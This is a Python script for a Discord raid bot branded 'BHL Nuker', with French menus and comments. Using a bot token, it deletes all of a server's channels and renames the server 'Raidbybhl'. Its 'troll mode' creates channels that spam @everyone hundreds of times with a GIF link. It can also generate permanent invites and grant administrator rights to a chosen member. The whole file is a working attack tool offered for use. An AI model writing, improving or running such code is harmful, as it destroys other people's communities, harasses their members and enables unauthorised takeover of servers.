import discord
import asyncio
import os
from colorama import Fore, Style, init

# Initialisation de colorama pour la couleur du texte
init(autoreset=True)

# Initialisation des intents
intents = discord.Intents.default()
intents.members = True  # Permet d'accéder aux informations des membres
intents.messages = True  # Permet d'écouter les messages

# Initialisation du client avec intents
client = discord.Client(intents=intents)

guilds_list = []  # Stocke les serveurs où le bot est présent

# Nouveau design ASCII art pour bhlnuker
ascii_art = r'''
██████╗ ██╗  ██╗██╗      ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║  ██║██║      ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║██║█████╗██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██║╚════╝██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║      ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝      ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
'''

def afficher_interface():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.GREEN + ascii_art)
    print(Fore.RED + "═" * 60)
    print(Fore.CYAN + "║" + Fore.YELLOW + "           BHL NUKER PANEL - POWERED BY BHL          " + Fore.CYAN + "║")
    print(Fore.RED + "═" * 60)
    print(Fore.CYAN + "║ " + Fore.WHITE + "1. Liste des serveurs" + " " * 36 + Fore.CYAN + "║")
    print(Fore.CYAN + "║ " + Fore.WHITE + "2. Renommer le serveur" + " " * 34 + Fore.CYAN + "║")
    print(Fore.CYAN + "║ " + Fore.WHITE + "3. Mode Troll (spam de salons)" + " " * 23 + Fore.CYAN + "║")
    print(Fore.CYAN + "║ " + Fore.WHITE + "4. NUKE COMPLET (suppression totale)" + " " * 16 + Fore.CYAN + "║")
    print(Fore.CYAN + "║ " + Fore.WHITE + "5. Donner les droits admin à un membre" + " " * 14 + Fore.CYAN + "║")
    print(Fore.RED + "═" * 60)
    print(Fore.LIGHTBLACK_EX + "║ " + "Developed by BHL | V3.0 | discord.gg/" + " " * 15 + Fore.CYAN + "║")
    print(Fore.RED + "═" * 60 + Style.RESET_ALL)

async def start_bot(token):
    @client.event
    async def on_ready():
        global guilds_list
        guilds_list = [(guild.name, guild.id) for guild in client.guilds]
        print(Fore.GREEN + f"[+] Bot connecté en tant que {client.user}")
        print(Fore.GREEN + "[+] Serveurs détectés :")
        for name, gid in guilds_list:
            print(Fore.GREEN + f"    - {name} (ID: {gid})")

        # Une fois le bot prêt, afficher le menu
        await cmd_interface()  # Appel asynchrone de cmd_interface

    await client.start(token)

def demander_token():
    # Affiche l'ASCII art avant de demander le token
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.GREEN + ascii_art)
    print(Fore.RED + "═" * 60)
    token = input(Fore.CYAN + "[?] Entrez le token du bot : ")
    # Lancer le bot de manière asynchrone
    asyncio.run(start_bot(token))

async def cmd_interface():
    while True:
        afficher_interface()
        try:
            choix = input(Fore.CYAN + "\n[>] Sélectionnez une option : " + Fore.WHITE)

            if choix == '1':
                os.system('cls' if os.name == 'nt' else 'clear')
                print(Fore.GREEN + "[+] Serveurs disponibles :")
                if guilds_list:
                    for name, gid in guilds_list:
                        print(Fore.GREEN + f"    - {name} (ID: {gid})")
                    sous_choix = input(Fore.CYAN + "\n[?] 1. Générer un lien d'invitation | 2. Retour : " + Fore.WHITE)
                    if sous_choix == '1':
                        serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))

                        async def generer_invite():
                            guild = discord.utils.get(client.guilds, id=serveur_id)
                            if guild and guild.text_channels:
                                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
                                print(Fore.GREEN + f"[+] Lien d'invitation : {invite.url}")
                            else:
                                print(Fore.RED + "[!] Serveur ou salon non trouvé.")

                        await generer_invite()
                        input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)

                else:
                    print(Fore.RED + "[!] Aucun serveur détecté")
                    input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)

            elif choix == '2':
                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))
                nouveau_nom = input(Fore.CYAN + "[?] Nouveau nom : " + Fore.WHITE)

                async def changer_nom():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        await guild.edit(name=nouveau_nom)
                        print(Fore.GREEN + f"[+] Serveur renommé : {nouveau_nom}")
                    else:
                        print(Fore.RED + "[!] Serveur non trouvé")

                await changer_nom()
                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)

            elif choix == '3':
                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))

                async def funny():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        tasks = []

                        # Suppression des salons existants
                        for channel in guild.channels:
                            if isinstance(channel, discord.TextChannel) and channel.name == "community" and channel.category is not None:
                                print(Fore.YELLOW + "[!] Salon 'community' protégé, ignoré")
                                continue
                            try:
                                tasks.append(channel.delete())
                                print(Fore.GREEN + f"[+] Salon {channel.name} supprimé")
                            except discord.errors.Forbidden:
                                print(Fore.RED + f"[!] Permission refusée pour {channel.name}")
                            except discord.errors.HTTPException as e:
                                print(Fore.RED + f"[!] Erreur: {e}")

                        await asyncio.gather(*tasks)
                        tasks.clear()

                        # Création de 15 salons
                        for i in range(15):
                            salon = await guild.create_text_channel("raided")
                            print(Fore.GREEN + f"[+] Salon {salon.name} créé")

                            for _ in range(30):
                                tasks.append(salon.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif"))
                                print(Fore.GREEN + f"[+] Spam envoyé dans {salon.name}")

                        await asyncio.gather(*tasks)

                    else:
                        print(Fore.RED + "[!] Serveur non trouvé")

                await funny()
                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)

            elif choix == '4':
                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur à NUKE : " + Fore.WHITE))

                async def supprimer_tous_les_salons_et_creer_nuked():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        for channel in guild.channels:
                            try:
                                await channel.delete()
                                print(Fore.GREEN + f"[+] Salon {channel.name} supprimé")
                            except discord.errors.Forbidden:
                                print(Fore.RED + f"[!] Permission refusée pour {channel.name}")
                            except discord.errors.HTTPException as e:
                                print(Fore.RED + f"[!] Erreur: {e}")

                        print(Fore.GREEN + "[+] NUKE terminé")

                        await guild.edit(name="Raidbybhl")
                        print(Fore.GREEN + "[+] Serveur renommé en Raidbybhl")

                        nuked_channel = await guild.create_text_channel("Raidbybhl")
                        print(Fore.GREEN + "[+] Salon Raidbybhl créé")
                        await nuked_channel.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif")
                        print(Fore.GREEN + "[+] Message envoyé")
                    else:
                        print(Fore.RED + "[!] Serveur non trouvé")

                await supprimer_tous_les_salons_et_creer_nuked()
                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)

            elif choix == '5':
                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))
                membre_id = int(input(Fore.CYAN + "[?] ID du membre : " + Fore.WHITE))

                async def creer_et_attribuer_role():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        permissions = discord.Permissions(administrator=True)
                        role = await guild.create_role(name="BHL", permissions=permissions)
                        print(Fore.GREEN + "[+] Rôle BHL créé")

                        membre = discord.utils.get(guild.members, id=membre_id)
                        if membre:
                            await membre.add_roles(role)
                            print(Fore.GREEN + f"[+] Admin donné à {membre.name}")
                        else:
                            print(Fore.RED + "[!] Membre non trouvé")
                    else:
                        print(Fore.RED + "[!] Serveur non trouvé")

                await creer_et_attribuer_role()
                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)

            else:
                print(Fore.RED + "[!] Option non valide")

        except ValueError:
            print(Fore.RED + "[!] Entrée invalide")
            input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour réessayer..." + Fore.WHITE)

# Démarrer le script en demandant le token
demander_token()
